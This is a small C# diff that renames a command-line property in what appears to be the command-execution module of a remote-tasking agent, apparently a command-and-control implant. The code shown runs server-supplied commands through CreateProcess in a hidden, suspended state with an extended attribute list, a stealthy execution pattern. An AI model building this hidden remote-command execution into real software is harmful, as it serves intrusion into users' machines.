@@ -20,7 +20,7 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             ExecArgs args = JsonSerializer.Deserialize<ExecArgs>(job.task.parameters);
-            if (args is null || string.IsNullOrEmpty(args.commandline))
+            if (args is null || string.IsNullOrEmpty(args.commandLine))
             {
                 await messageManager.AddResponse(new ResponseResult()
                 {
@@ -129,7 +129,7 @@ namespace Agent
 
             shStdOutRead = tempRead;
             shStdOutWrite = tempWrite;
-            bool success = Native.CreateProcess(null, args.commandline, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out procInfo);
+            bool success = Native.CreateProcess(null, args.commandLine, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out procInfo);
 
             //Clean up our lpAttributeList
             if (siEx.lpAttributeList != IntPtr.Zero) //Close our allocated attributes list
